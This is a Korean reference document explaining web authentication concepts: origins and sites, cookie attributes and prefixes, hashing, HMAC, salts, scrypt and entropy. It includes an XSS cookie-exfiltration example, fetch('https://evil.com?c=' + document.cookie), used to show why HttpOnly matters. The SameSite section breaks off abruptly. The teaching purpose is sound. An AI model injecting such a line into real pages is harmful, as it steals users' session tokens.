01 웹 인증 개념

인증 문서들이 안다고 보고 쓰는 웹 보안 개념을 모았다. 이 저장소의 코드와 상관없는 일반 개념만 다룬다. 처음부터 읽기보다, 다른 문서에서 링크로 넘어와 필요한 절만 읽는 참고 문서다. 새 개념이 필요해지면 이 문서에 절을 더한다.

출처와 사이트

브라우저 보안 규칙은 "같은 곳에서 온 요청인가"를 자주 묻는다. 이때 "같은 곳"의 기준이 두 가지 있다. 같은 주소 하나를 두 기준으로 잘라 보면 차이가 보인다.

출처로 볼 때: 색칠한 세 부분이 모두 같아야 같은 출처다.

https://store.example.com:443/shows https의 기본 포트 443은 주소에 보통 생략되지만, 비교할 때는 들어간다.

사이트로 볼 때: 색칠한 두 부분만 같으면 같은 사이트다.

https://store.example.com:443/shows 사이트는 보는 부분이 적어서, 출처보다 넓은 묶음이 된다.
  • 출처(origin)는 스킴 + 호스트 + 포트다. 세 개가 모두 같아야 같은 출처다. https://store.example.com과 https://api.example.com은 호스트가 달라 다른 출처다.
  • 사이트(site)는 더 넓다. 스킴과 "등록 가능한 도메인"(example.com처럼 돈 내고 사는 단위)이 같으면 같은 사이트다. 서브도메인과 포트는 보지 않는다. store.example.com과 api.example.com은 같은 사이트다.
A B 같은 출처? 같은 사이트?
https://example.com https://example.com/shows 같다 (경로는 보지 않는다) 같다
https://store.example.com https://api.example.com 다르다 (호스트) 같다
http://localhost:3000 http://localhost:3001 다르다 (포트) 같다
https://example.com http://example.com 다르다 (스킴) 다르다 (요즘 브라우저는 스킴도 본다)
https://example.com https://evil.com 다르다 다르다

어떤 도메인이 "등록 가능한 단위"인지는 공개 접미사 목록(Public Suffix List)으로 정한다. 그래서 a.github.io와 b.github.io는 서로 다른 사이트다. github.io가 공개 접미사이기 때문이다.

https://a.github.io com처럼 github.io도 공개 접미사라, 그 바로 아래 a.github.io까지가 등록 가능한 도메인이다. 그래서 a.github.io와 b.github.io는 서로 남이다.

이 프로젝트의 로컬 환경이 바로 "다른 출처, 같은 사이트"다. 스토어는 http://localhost:3001, API는 http://localhost:3000이다. 포트가 달라 출처는 다르고, 사이트는 같다. 그래서 스토어가 API를 부를 때 브라우저에서 직접 부르면 CORS 허용이 필요하지만, SameSite 쿠키는 막히지 않는다.

브라우저는 다른 출처로 요청을 보낼 때 Origin 헤더에 요청을 보낸 페이지의 출처를 적는다. 페이지 자바스크립트가 이 헤더를 바꿀 수 없으므로, 서버는 이 값으로 요청이 어디서 왔는지 판단할 수 있다.

스토어 페이지가 API로 로그아웃 요청을 보낸다
https://store.example.com/my
"로그아웃" 버튼을 누른다
POST /auth/sign-out
Origin: https://store.example.com
api.example.comOrigin 헤더를 읽는다
브라우저가 보고 있던 페이지의 출처를 대신 적어 준다 → 서버는 어디서 온 요청인지 안다 
POST /auth/sign-out HTTP/1.1
Host: api.example.com
Origin: https://store.example.com

CORS는 출처를, SameSite는 사이트를 기준으로 판단한다. 둘을 헷갈리면 "같은 회사 서브도메인끼리인데 왜 막히지?", "다른 서브도메인인데 왜 안 막히지?"가 생긴다.

쿠키 기본

HTTP는 요청마다 따로 논다. 서버는 방금 요청을 보낸 사람이 아까 로그인한 그 사람인지 모른다. 쿠키는 서버가 브라우저에 맡겨 두는 작은 쪽지다. 한 번 맡기면 브라우저가 그 서버로 가는 요청마다 쪽지를 다시 보여 준다. 놀이공원에서 손등에 찍어 주는 도장과 비슷하다. 한 번 찍으면 놀이기구를 탈 때마다 손등을 내밀면 된다.

  1. 브라우저
  2. 서버
  1. POST /login
  2. 200 OK Set-Cookie: sid=abc123; HttpOnly; Path=/
  3. 쿠키 저장소에 sid=abc123 보관
  4. GET /me Cookie: sid=abc123
  5. GET /orders Cookie: sid=abc123

서버는 응답의 Set-Cookie 헤더로 쿠키를 맡긴다. 이름=값 뒤에 세미콜론으로 속성을 붙인다. 속성은 "언제, 어디로 보낼지"를 정하는 규칙이고, 브라우저만 읽는다. 다시 보낼 때는 이름과 값만 Cookie 헤더에 실린다.

서버가 맡길 때 (응답의 Set-Cookie)

Set-Cookie: sid=abc123; Max-Age=604800; Path=/; Domain=example.com; Secure; HttpOnly; SameSite=Lax 초록이 쿠키 자체, 파랑은 브라우저에게 주는 보관 규칙이다. 규칙은 서버로 다시 돌아오지 않는다.

브라우저가 돌려줄 때 (요청의 Cookie)

Cookie: sid=abc123; theme=dark 이름=값만 실린다. 이 요청에 보낼 조건(경로, 호스트, HTTPS, SameSite)을 통과한 쿠키가 모두 한 줄로 붙는다.
속성 정하는 것 절
Max-Age, Expires 언제까지 보관하나 Max-Age
Domain 어느 호스트로 보내나 Domain
Path 어느 경로 아래로 보내나. Path=/면 모든 경로 이 절
Secure HTTPS로만 보내나 Secure
HttpOnly 자바스크립트에서 숨기나 HttpOnly
SameSite 다른 사이트에서 시작된 요청에도 보내나 SameSite

쿠키를 지우는 별도 명령은 없다. 같은 이름, 같은 Domain과 Path로 이미 지난 만료를 적은 Set-Cookie를 보내면 브라우저가 지운다. 속성이 다르면 브라우저는 다른 쿠키로 보고 지우지 않는다. Express의 res.clearCookie(name, options)가 이 일을 하며, 구울 때와 같은 옵션을 넘겨야 하는 이유다.

같은 이름, 같은 Path로 지난 날짜를 보내면 sid=abc123저장된 쿠키, Path=/ Set-Cookie: sid=; Path=/; Expires=1970년 지워진다
Path가 다르면 sid=abc123저장된 쿠키, Path=/ Set-Cookie: sid=; Path=/auth; Expires=1970년 그대로 남는다 브라우저는 Path=/auth인 다른 쿠키를 지우려는 것으로 본다 
// Express
res.cookie('sid', 'abc123', { httpOnly: true, path: '/' }); // Set-Cookie: sid=abc123; Path=/; HttpOnly
res.clearCookie('sid', { httpOnly: true, path: '/' }); // Set-Cookie: sid=; Path=/; Expires=Thu, 01 Jan 1970 00:00:00 GMT; HttpOnly

브라우저의 fetch는 같은 출처 요청에는 쿠키를 싣지만, 다른 출처로 보낼 때는 credentials: 'include'를 켜야 쿠키를 싣고, 응답의 Set-Cookie도 받아들인다.

credentials를 켜지 않고 부른다

fetch('https://api.example.com/me')

api.example.com로그인 안 한 요청으로 본다
다른 출처로 가는 fetch의 기본값 → 쿠키를 싣지 않는다
  • 쿠키
credentials: 'include'로 부른다
https://store.example.com

GET /me

명시적으로 켰다 → 쿠키를 싣는다

await fetch('https://api.example.com/me', { credentials: 'include' });

HttpOnly

HttpOnly를 붙인 쿠키는 document.cookie에 나타나지 않는다. 페이지 자바스크립트는 읽지도 쓰지도 못하고, 브라우저가 요청에 실어 보내기만 한다.

브라우저 쿠키 저장소에 sid=abc123(HttpOnly)과 theme=dark(일반)가 함께 있다고 하자. 같은 저장소라도 꺼내 가는 길에 따라 보이는 것이 다르다.

페이지 자바스크립트가 읽을 때 sid=abc123 🔒
theme=dark쿠키 저장소 document.cookie 'theme=dark' sid는 아예 보이지 않는다
브라우저가 요청에 실을 때 sid=abc123 🔒
theme=dark쿠키 저장소 요청에 싣기 Cookie: sid=abc123; theme=dark 서버에는 둘 다 간다 
// Set-Cookie: sid=abc123; HttpOnly
// Set-Cookie: theme=dark
document.cookie; // 'theme=dark'  ← sid는 보이지 않는다

막으려는 것은 XSS(남이 심은 스크립트가 내 페이지에서 실행되는 것)로 세션 토큰을 훔쳐 가는 일이다. 토큰이 스크립트에 보이면 fetch('https://evil.com?c=' + document.cookie) 한 줄로 공격자 서버에 넘어가고, 공격자는 자기 컴퓨터에서 그 토큰으로 계속 로그인한다.

HttpOnly가 없으면: 토큰이 공격자 서버로 간다
https://store.example.com/reviews/12
후기 글에 심어진 스크립트
fetch('https://evil.com?c=' + document.cookie)
GET evil.com
?c=sid=abc123
evil.com공격자 서버
공격자가 sid=abc123을 자기 브라우저에 넣는다 → 사용자로 계속 로그인
HttpOnly가 있으면: 빈손으로 간다
https://store.example.com/reviews/12
같은 스크립트
fetch('https://evil.com?c=' + document.cookie)
GET evil.com
?c=theme=dark
evil.com공격자 서버
document.cookie에 sid가 없다 → 토큰은 새어 나가지 않는다

HttpOnly는 토큰을 가져가는 것만 막는다. XSS 스크립트가 그 페이지 안에서 fetch('/orders', { method: 'POST' })를 보내면 브라우저는 쿠키를 그대로 싣는다. XSS 자체는 입력을 이스케이프하는 등 다른 방법으로 막아야 한다.

세션 토큰을 localStorage에 두면 이 보호를 받을 수 없다. localStorage는 늘 자바스크립트에 보이기 때문이다.

토큰을 둔 곳 XSS 스크립트가 읽을 수 있나 요청에 저절로 실리나
HttpOnly 쿠키 (이 프로젝트) 없다 실린다
일반 쿠키 있다 (document.cookie) 실린다
localStorage 있다 (localStorage.getItem) 안 실린다. 코드가 헤더에 직접 넣는다

이 프로젝트의 세션 쿠키는 늘 HttpOnly다(apps/api/src/auth/session-manager.ts의 httpOnly: true).

Secure

Secure를 붙인 쿠키는 HTTPS 요청에만 실린다. HTTP는 내용이 암호화되지 않아, 같은 와이파이에 있는 사람이 요청을 엿보면 쿠키가 그대로 보인다. 운영 환경에서 세션 쿠키에는 늘 붙인다.

Secure가 없을 때: 카페 와이파이에서 http 주소로 들어가면

  1. 사용자 브라우저
  2. 같은 와이파이의 공격자
  3. example.com
  1. 사용자가 주소창에 http://example.com 을 직접 입력했다
  2. GET http://example.com/ Cookie: sid=abc123 (암호화 안 됨)
  3. 지나가는 요청에서 sid=abc123을 그대로 읽는다
  4. GET /me Cookie: sid=abc123 (훔친 쿠키)

Secure를 붙이면 1번 요청에 쿠키가 아예 실리지 않는다. 브라우저가 주소의 스킴을 보고 판단한다.

example.com내용이 암호화되어 간다
https → Secure 쿠키를 싣는다
  • Secure 쿠키
  • 일반 쿠키
http 주소로 가는 요청
http://example.com
주소를 http로 직접 입력했다
GET /
(Secure 쿠키 없음)
example.com누구나 엿볼 수 있는 길

로컬 개발 서버는 보통 http://localhost다. 요즘 브라우저는 localhost를 예외로 보고 Secure 쿠키를 허용하기도 하지만, 브라우저마다 다를 수 있다. 그래서 로컬에서는 Secure를 끄고 운영에서만 켜는 설정을 흔히 쓴다.

이 프로젝트 주소 세션 쿠키
로컬 http://localhost:3000 openrun.session_token=…; HttpOnly; SameSite=Lax (Secure 없음)
운영 (NODE_ENV=production) https __Secure-openrun.session_token=…; Secure; HttpOnly; SameSite=Lax

이 선택은 apps/api/src/config/env.ts의 readUseSecureCookies가 정한다. 이름 앞의 __Secure-는 쿠키 이름 접두사에서 다룬다.

Domain과 호스트 전용 쿠키

Domain은 쿠키를 어느 호스트로 보낼지 정한다. 생략했을 때와 적었을 때 동작이 크게 다르다. api.example.com이 로그인 응답으로 쿠키를 구운 뒤, 브라우저가 두 서버로 요청을 보내는 장면을 비교해 보자.

Domain을 생략하면: 구운 호스트에만 간다

  1. 브라우저
  2. api.example.com
  3. store.example.com
  1. Set-Cookie: sid=abc123; Path=/ Domain 없음
  2. GET /me Cookie: sid=abc123
  3. GET /my-page 쿠키 없음

Domain=example.com을 적으면: 상위 도메인과 모든 서브도메인으로 간다

  1. 브라우저
  2. api.example.com
  3. store.example.com
  1. Set-Cookie: sid=abc123; Path=/; Domain=example.com
  2. GET /me Cookie: sid=abc123
  3. GET /my-page Cookie: sid=abc123
api.example.com이 보낸 Set-Cookie api.example.com store.example.com example.com
Domain 없음 (호스트 전용 쿠키) 보낸다 보내지 않는다 보내지 않는다
Domain=example.com 보낸다 보낸다 보낸다
  • 생략하면 호스트 전용 쿠키다. 쿠키를 구운 호스트에만, 정확히 그 이름으로 간다. 서브도메인에도 가지 않는다. 가장 좁고 안전하다.
  • 상위 도메인을 적으면 그 도메인과 모든 서브도메인으로 간다. api.example.com이 구운 쿠키를 store.example.com의 서버도 받아야 할 때 쓴다.
  • 쿠키를 굽는 호스트 자신이거나 그 상위 도메인만 적을 수 있다. api.example.com이 Domain=other.com이나 공개 접미사(Domain=com)를 적으면 브라우저가 쿠키를 버린다.
api.example.com이 보낸 Domain 값을 브라우저가 검사한다 Domain=example.com 내 상위 도메인인가? 받는다
Domain=other.com 내 상위 도메인인가? 버린다 남의 도메인에 쿠키를 심을 수 없다
Domain=com 공개 접미사인가? 버린다 모든 .com 사이트에 쿠키를 뿌릴 수 없다

넓힐수록 쿠키를 받는 서버가 늘어난다. 서브도메인 중 하나라도 허술하면 그쪽에서 쿠키가 새어 나갈 수 있으므로, 필요할 때만 넓힌다.

이 프로젝트의 쿠키 Domain 이유
사용자 세션 환경 변수 COOKIE_DOMAIN. 없으면 생략 스토어와 API가 서브도메인으로 나뉘는 배포에서 스토어 서버도 쿠키를 받아야 한다
운영자 세션 늘 생략 (API 호스트 전용) 어드민은 SPA라 서버 렌더링에서 쿠키를 읽을 일이 없다 (ADR 0010)

Max-Age: 영속 쿠키와 세션 쿠키

쿠키의 보관 기간은 Max-Age(지금부터 몇 초)나 Expires(날짜)로 정한다. 둘 다 있으면 Max-Age가 이긴다.

  • 영속 쿠키: Max-Age나 Expires가 있다. 브라우저를 껐다 켜도 그 기간까지 남는다.
  • 세션 쿠키: 둘 다 없다. 브라우저 세션이 끝나면, 보통 브라우저를 닫으면 사라진다. 이름의 "세션"은 브라우저 세션을 뜻하며, 서버의 로그인 세션과는 다른 말이다.
영속 쿠키Max-Age=604800 (7일)
브라우저를 닫아도 남는다 브라우저 닫음
세션 쿠키Max-Age 없음
닫을 때까지 브라우저 닫음

Chrome의 "시작할 때 이전 탭 다시 열기"처럼 세션을 복원하는 설정을 켜면 세션 쿠키도 살아남을 수 있다. 그래서 쿠키가 사라지는 것에만 기대지 말고, 서버에도 만료를 따로 둔다.

이 프로젝트는 로그인 요청의 rememberMe(로그인 상태 유지) 값으로 이 둘을 고른다. 켜면 Max-Age를 붙인 영속 쿠키, 끄면 Max-Age 없는 세션 쿠키를 굽는다. 어느 쪽이든 서버의 세션 행에도 만료 시각이 따로 있다(켜면 7일, 끄면 1일).

HTTP 헤더의 Max-Age는 초 단위지만, Express의 res.cookie 옵션 maxAge는 밀리초다. Express가 초로 바꿔 헤더를 쓴다.

maxAge: 604800000Express 옵션, 밀리초 (7일) ÷ 1000 Max-Age=604800HTTP 헤더, 초 (7일) 
res.cookie('sid', 'abc123', { maxAge: 7 * 24 * 60 * 60 * 1000 }); // Set-Cookie: sid=abc123; Max-Age=604800; ...

쿠키 이름 접두사

쿠키 이름이 특정 접두사로 시작하면 브라우저가 속성을 강제로 검사한다. 조건에 맞지 않는 쿠키는 받아들이지 않는다. 다른 서브도메인이나 HTTP 페이지가 같은 이름의 쿠키를 덮어쓰는 공격을 막는다.

__Secure-openrun.session_token 운영 환경의 사용자 세션 쿠키 이름이다. 로컬은 http라 Secure를 쓸 수 없어 접두사 없이 openrun.session_token만 쓴다.

막으려는 공격은 이렇다. 공격자가 http 응답 하나를 조작할 수 있다면(같은 와이파이에서 http 요청을 가로채는 등), 그 응답에 같은 이름의 쿠키를 심어 진짜 세션 쿠키를 자기 값으로 바꿔치기할 수 있다.

접두사가 없을 때: 조작된 http 응답이 쿠키를 심는다 Set-Cookie: sid=공격자값http 응답, Secure 없음 브라우저 검사 없음 받아들인다 같은 이름이라 진짜 쿠키를 덮거나 섞인다
__Secure- 접두사가 있을 때 Set-Cookie: __Secure-sid=공격자값http 응답, Secure 없음 Secure이고 https에서 왔나? 버린다 조건을 못 맞추니 이름을 흉내 낼 수 없다
접두사 브라우저가 요구하는 것
__Secure- Secure 속성이 있고, HTTPS 페이지에서 구웠다
__Host- __Secure-의 조건에 더해 Domain이 없고(호스트 전용) Path=/다

__Host-가 가장 엄격하지만 Domain을 쓸 수 없다. 여러 서브도메인이 함께 읽어야 하는 쿠키라면 __Secure-까지만 쓸 수 있다.

이 프로젝트의 사용자 세션 쿠키가 __Host-가 아니라 __Secure-인 이유도 이것이다. 배포에 따라 COOKIE_DOMAIN으로 Domain을 적어야 하기 때문이다 (apps/api/src/users/user-session.ts).

SameSite

SameSite는 다른 사이트에서 시작된 요청에 쿠키를 실을지 정한다.

"요청이 어디서 시작됐나"는 요청을 일으킨 페이지, 곧 그 순간 브라우저 주소창에 떠 있는 페이지를 말한다. 요청이 가는 곳은 늘 example.com으로 같다. 브라우저는 요청을 보낼 때마다 두 주소를 비교한다.

  • 요청을 일으킨 페이지의 사이트: 사용자가 지금 보고 있는 페이지

해시 함수

해시 함수는 어떤 길이의 입력이든 정해진 길이의 "지문"으로 바꾼다. SHA-256은 늘 256비트(16진수 64자)를 낸다. 

import { createHash } from 'node:crypto';

createHash('sha256').update('hello').digest('hex');
// '2cf24dba5fb0a30e26e83b2ac5b9e29e1b161e5c1fa7425e73043362938b9824'
createHash('sha256').update('hellp').digest('hex');
// 'fdd7585e08c4e2afd71dcabdb4636c89d557a3f42db9e2040c8bbd1708aa4ce7'
// 한 글자만 달라도 완전히 다른 값이 된다

암호에 쓰는 해시 함수에는 세 가지 성질이 있다.

  1. 같은 입력은 늘 같은 출력 그래서 저장해 둔 해시와 새로 계산한 해시를 비교할 수 있다.
  2. 거꾸로 돌릴 수 없다 해시에서 원래 입력을 계산해 낼 방법이 없다. 찾으려면 입력을 하나씩 넣어 보는 수밖에 없다.
  3. 충돌을 찾기 어렵다 같은 해시가 나오는 서로 다른 두 입력을 찾을 수 없다.

지문에 빗대면, 지문으로 그 사람인지 확인할 수는 있지만 지문만 보고 그 사람의 얼굴을 그려 낼 수는 없다. 그래서 DB에 원문 대신 해시를 두면, DB를 통째로 도둑맞아도 원문은 드러나지 않는다.

실제로 어떻게 쓰나: 세션 토큰

이 프로젝트에서 해시가 하는 일은 하나다. 로그인한 사용자에게 준 세션 토큰을 DB에 원문 그대로 두지 않는 것이다. 토큰은 aB3xK9pQ처럼 짧게 줄여 적는다(실제는 32자). 쿠키에 함께 붙는 서명은 HMAC 절에서 다루고 여기서는 뺀다.

① 로그인할 때: 원문은 브라우저에, 해시는 DB에

  1. 브라우저
  2. API 서버
  3. DB
  1. POST /auth/sign-in 이메일과 비밀번호
  2. 무작위 토큰을 만든다 aB3xK9pQ
  3. SHA-256으로 해시한다 aB3xK9pQ → e4f493ea…
  4. sessions 행 저장 token_hash = e4f493ea… (해시만)
  5. 200 Set-Cookie: 토큰 원문 aB3xK9pQ

원문은 브라우저 쿠키에만 있고, DB에는 해시만 있다. 서버는 원문을 따로 기억하지 않는다.

② 다음 요청 때: 쿠키 값을 다시 해시해서 찾는다

  1. 브라우저
  2. API 서버
  3. DB
  1. GET /me Cookie: aB3xK9pQ
  2. 쿠키 값을 SHA-256으로 해시한다 aB3xK9pQ → e4f493ea…
  3. token_hash = e4f493ea… 인 행을 찾는다
  4. 행이 있다 user_id, 만료 시각
  5. 200 로그인한 사용자 정보

성질 1(같은 입력은 늘 같은 출력) 덕분이다. 로그인 때 계산한 해시와 지금 계산한 해시가 같으니, 원문을 저장하지 않고도 같은 토큰인지 알 수 있다.

③ DB를 도둑맞았을 때: 해시로는 로그인할 수 없다

  1. 공격자
  2. API 서버
  3. DB
  1. 공격자가 DB 백업을 손에 넣어 e4f493ea…를 알아냈다
  2. GET /me Cookie: e4f493ea… (훔친 해시를 그대로 쿠키에)
  3. 쿠키 값을 SHA-256으로 해시한다 e4f493ea… → ae7e27cb… (전혀 다른 값)
  4. token_hash = ae7e27cb… 인 행을 찾는다
  5. 그런 행이 없다
  6. 401

서버는 받은 값을 늘 한 번 더 해시하므로, 해시를 그대로 보내면 해시의 해시가 되어 맞지 않는다. 통과하려면 해시 e4f493ea…가 나오는 원문 aB3xK9pQ를 알아내야 하는데, 성질 2(거꾸로 돌릴 수 없다) 때문에 그럴 수 없다. 원문을 그대로 저장했다면 공격자는 DB 값을 쿠키에 넣는 것만으로 모든 사용자로 로그인할 수 있었을 것이다.

원문을 저장했다면 해시를 저장하면
DB에 있는 값 aB3xK9pQ e4f493ea…
훔친 값을 쿠키에 넣으면 그대로 로그인된다 다시 해시되어 맞는 행이 없다
서버가 같은 토큰인지 아는 법 값을 그대로 비교 쿠키 값을 해시해서 비교

비밀번호도 같은 모양이다. 가입할 때 해시를 저장하고, 로그인할 때 입력값을 다시 해시해 비교한다. 다른 점은 아래 상자에 있다. 이 프로젝트의 실제 코드는 05 세션 토큰과 04 비밀번호 해시에서 본다.

"거꾸로 돌릴 수 없다"는 입력이 추측하기 어려울 때만 쓸모가 있다. 비밀번호처럼 사람이 고른 짧은 값은 흔한 후보를 넣어 보면 금방 맞는다. 그래서 비밀번호에는 SHA-256을 쓰지 않고 느린 해시를 쓴다. 반대로 충분히 긴 무작위 토큰은 넣어 볼 후보가 너무 많아 SHA-256 하나로 충분하다.

암호화와 해시의 차이

암호화는 키가 있으면 되돌릴 수 있다. 해시는 누구도 되돌릴 수 없다. 자물쇠 달린 상자와 믹서기의 차이다. 자물쇠 상자는 열쇠만 있으면 넣은 물건을 그대로 꺼낼 수 있지만, 믹서기에 간 과일은 누구도 원래대로 되돌리지 못한다.

암호화: 키로 잠그고 같은 키로 연다 4111-1111-1111-1111카드 번호 암호화 (키) lmOygklMx9Iw94zG…암호문, DB에 저장 복호화 (같은 키) 4111-1111-1111-1111원문이 그대로 나온다
해시: 키가 없고, 한 방향으로만 간다 password1비밀번호 SHA-256 0b14d501a594…해시, DB에 저장 되돌리기 ?방법이 없다

암호문 예시는 AES-256-GCM으로 실제 계산한 값의 앞부분이다. 키를 모르는 사람에게는 의미 없는 글자지만, 키를 가진 서버는 언제든 카드 번호를 다시 읽을 수 있다. 해시 쪽은 키를 가진 사람이 아예 없다.

어느 쪽을 쓸지는 "서버가 나중에 원문을 다시 읽어야 하나?" 하나로 정한다.

암호화 해시 HMAC
키 있다 없다 있다
원문으로 되돌리기 키로 되돌린다 불가능 불가능 (원문은 보통 옆에 그대로 둔다)
쓰는 곳 나중에 다시 읽어야 하는 비밀 (카드 정보, 외부 서비스 토큰) 맞는지 확인만 하면 되는 값 (비밀번호, 세션 토큰 저장) 위조되지 않았는지 확인 (서명된 쿠키, 웹훅)

비밀번호를 암호화해 저장하면 키를 가진 사람(또는 키를 훔친 사람)은 모든 비밀번호를 원문으로 읽을 수 있다. 서버는 비밀번호 원문을 다시 볼 일이 없으므로 해시가 맞다. "비밀번호 찾기"가 원래 비밀번호를 보여 주지 않고 재설정만 시키는 이유다.

어떤 사이트가 "비밀번호 찾기"로 원래 비밀번호를 메일로 보내 준다면, 그 사이트는 비밀번호를 암호화했거나 원문 그대로 저장했다는 뜻이다. 해시로 저장했다면 서버도 원문을 모른다.

HMAC: 비밀키로 만든 서명

해시는 누구나 계산할 수 있다. 쿠키 값 옆에 그 값의 SHA-256을 붙여도, 쿠키를 바꾼 사람이 해시도 다시 계산해 붙이면 그만이다. HMAC은 서버만 아는 비밀키를 섞어 해시를 만든다. 키를 모르면 맞는 값을 계산할 수 없으므로, 서버는 "이 값은 내가 만든 그대로다"를 확인할 수 있다. 

import { createHmac } from 'node:crypto';

const secret = 'server-only-secret-at-least-32-chars';
const value = 'user=42';
const signature = createHmac('sha256', secret).update(value).digest('base64');
const cookie = `${value}.${signature}`; // 'user=42.sH9/vw7Q35n/...'

// 받을 때: 서명을 다시 계산해 비교한다. 값을 'user=1'로 바꾸면 서명이 맞지 않는다.
서명 만들기: 값과 비밀키를 함께 넣는다 user=42값 + server-only-secret…비밀키, 서버만 안다 HMAC-SHA256 sH9/vw7Q35n/…서명
키가 다르면 전혀 다른 서명이 나온다 user=42 + guess-secret공격자가 짐작한 키 HMAC-SHA256 7o0I2bslDi4g…맞지 않는다

봉투의 밀랍 도장과 같다. 도장이 깨지지 않았으면 왕이 봉한 그대로라고 믿을 수 있다. 하지만 봉투 겉에 적힌 글은 누구나 읽는다.

쿠키를 바꿔 보면

서버가 user=42.sH9/vw7Q35n/… 쿠키를 내려 줬다. 사용자가 이 쿠키를 고쳐 보내면 서버는 받은 값으로 서명을 다시 계산해 쿠키에 붙은 서명과 비교한다. 아래 값은 모두 실제로 계산했다.

① 그대로 보낸다 user=42 . sH9/vw7Q…받은 쿠키 HMAC(user=42) sH9/vw7Q…붙은 서명과 같다 → 통과
② 값만 42 → 1로 바꾼다 user=1 . sH9/vw7Q… HMAC(user=1) jQ+ayxrqJBg3…붙은 서명과 다르다 → 거절
③ 값을 바꾸고 SHA-256을 새로 계산해 붙인다 user=1 . eOLdUjYc…누구나 계산할 수 있는 해시 HMAC(user=1) jQ+ayxrqJBg3…여전히 다르다 → 거절

③이 그냥 해시와 HMAC의 차이다. 서명이 SHA-256뿐이었다면 공격자가 user=1의 해시를 직접 계산해 붙여 통과했을 것이다. HMAC은 비밀키 없이 계산할 수 없으므로, 공격자가 맞는 서명 jQ+ayxrq…를 만들 방법이 없다.

비밀키가 짧거나 추측 가능하면 공격자가 키 후보를 넣어 보며 맞는 서명을 찾을 수 있다. 키는 충분히 긴 무작위 문자열로 만든다(예: openssl rand -base64 32).

솔트

같은 비밀번호는 같은 해시가 된다. 그러면 두 가지 문제가 생긴다.

  • DB에서 해시가 같은 사용자들은 비밀번호가 같다는 것이 드러난다.
  • 공격자가 흔한 비밀번호 수억 개의 해시를 미리 계산해 표로 만들어 두면(레인보우 테이블), 훔친 해시를 표에서 찾기만 하면 된다.
솔트 없이: 사용자 A와 B가 둘 다 password1 password1A SHA-256 0b14d501a594…
password1B SHA-256 0b14d501a594… A와 똑같다. 둘의 비밀번호가 같다는 것이 드러난다
공격자가 미리 만들어 둔 표 0b14d501a594… 표에서 찾기 password1 계산 없이 바로 찾는다

솔트는 사용자마다 새로 뽑는 무작위 값이다. 비밀번호에 솔트를 섞어 해시하면, 같은 비밀번호도 사용자마다 다른 해시가 된다. 미리 만든 표는 쓸모가 없어지고, 공격자는 사용자 한 명 한 명을 따로 공격해야 한다.

솔트를 섞으면: 같은 password1도 결과가 다르다 password1A + 9f2c41d0…A의 솔트 scrypt f79c642d5da7…
password1B + 3b7e0c92…B의 솔트 scrypt 3f72210fd925… A와 전혀 다르다

위 값은 이 프로젝트와 같은 scrypt 설정으로 실제 계산했다. 공격자가 표를 미리 만들려면 솔트마다 표를 따로 만들어야 하는데, 솔트는 16바이트(2128가지)라 불가능하다.

솔트는 비밀이 아니다. 확인할 때 같은 솔트로 다시 계산해야 하므로 해시 옆에 그대로 저장한다. 솔트의 역할은 숨는 것이 아니라 사용자마다 다른 것이다. 이 프로젝트는 솔트:키 모양의 문자열 하나로 저장한다.

느린 해시: scrypt, bcrypt, Argon2

SHA-256은 빠르게 만들어졌다. 요즘 GPU 하나로 1초에 수십억 번 계산한다. 비밀번호 해시가 유출되면 공격자는 흔한 비밀번호 목록을 넣어 보며 맞는 것을 찾는데, 해시가 빠르면 이 시도도 빠르다.

비밀번호용 해시는 일부러 느리게 만든다. 로그인할 때 수십 ms 더 걸리는 것은 사용자가 느끼지 못하지만, 수없이 시도해야 하는 공격자에게는 그 시간이 시도 횟수만큼 곱해진다.

아래는 이 개발 기기의 CPU 한 코어에서 password1을 해시하는 데 걸린 시간을 잰 것이다.

SHA-256약 0.0007ms, 실제로는 이 점보다 짧다
scrypt이 프로젝트 설정, 약 58ms
scrypt 한 번

사용자에게 58ms는 눈 깜빡할 새다. 하지만 공격자가 훔친 해시 하나에 비밀번호 후보 1억 개를 넣어 보면 이렇게 된다.

실제 공격자는 코어를 많이 쓰므로 절대 시간은 줄어든다. 하지만 SHA-256에 비해 한 번에 수만 배 비싸다는 비율은 그대로 남고, scrypt는 아래에서 보듯 GPU로도 쉽게 줄일 수 없게 만들어졌다.

"메모리 하드"는 계산 한 번에 큰 메모리를 쓰게 한다는 뜻이다. GPU나 전용 칩은 연산 장치는 많지만 장치마다 쓸 메모리가 적어서, 동시에 많이 돌리기 어려워진다.

이 프로젝트의 scrypt 한 번 password1NFKC 정규화한 비밀번호 + 9f2c41d0…솔트 16바이트 scrypt (N=16384, r=16, p=1) f79c642d5da7…키 64바이트
  • N=16384: 반복하고 메모리를 늘리는 크기. 클수록 느리고 메모리를 많이 쓴다.
  • r=16: 한 덩어리의 크기. 메모리 사용량은 약 128 × N × r = 32MiB다.
  • p=1: 병렬로 나눠 계산하는 개수.

해시 한 번에 32MiB가 필요하므로, 메모리가 8GB인 장치라도 동시에 돌릴 수 있는 계산은 수백 개 수준으로 묶인다. 

import { randomBytes, scrypt } from 'node:crypto';

const salt = randomBytes(16).toString('hex');
scrypt('password1', salt, 64, { N: 16384, r: 16, p: 1, maxmem: 64 * 1024 * 1024 }, (error, key) => {
  // key: 64바이트 Buffer. 저장할 때는 `${salt}:${key.toString('hex')}`처럼 솔트와 함께 둔다.
});

이런 함수를 키 유도 함수(KDF, key derivation function)라고도 부른다. 비밀번호에서 고정 길이의 키를 "뽑아내는" 함수라는 뜻이다.

세션 토큰, 솔트, 인증 메일 토큰처럼 남이 맞히면 안 되는 값은 암호학적으로 안전한 난수로 만든다. Math.random()은 빠르고 고르게 퍼지지만, 지금까지 나온 값을 보면 다음 값을 예측할 수 있는 방식이라 이 용도에 쓰지 않는다.

엔트로피: 몇 번 넣어 봐야 맞히나

엔트로피는 값이 얼마나 예측하기 어려운지를 비트로 센다. 가능한 경우의 수가 2n이면 n비트다. 동전 한 번은 1비트, 동전 열 번은 10비트(1,024가지)다.

문자 종류가 k개인 글자를 L자 뽑으면 경우의 수는 kL이고, 엔트로피는 L × log₂(k)비트다. 자리마다 다이얼이 하나씩 있는 자물쇠를 떠올리면 된다.

aB3x…Q 세션 토큰 32자리. 자리마다 영문 대소문자와 숫자 62가지 중 하나다. 경우의 수는 62를 32번 곱한 수 ≈ 2190이다.
값 계산 엔트로피
숫자 6자리 인증번호 6 × log₂(10) ≈ 6 × 3.32 약 20비트 (100만 가지)
영문 대소문자와 숫자 62종 중 32자 32 × log₂(62) ≈ 32 × 5.95 약 190비트
무작위 16바이트 16 × 8 128비트

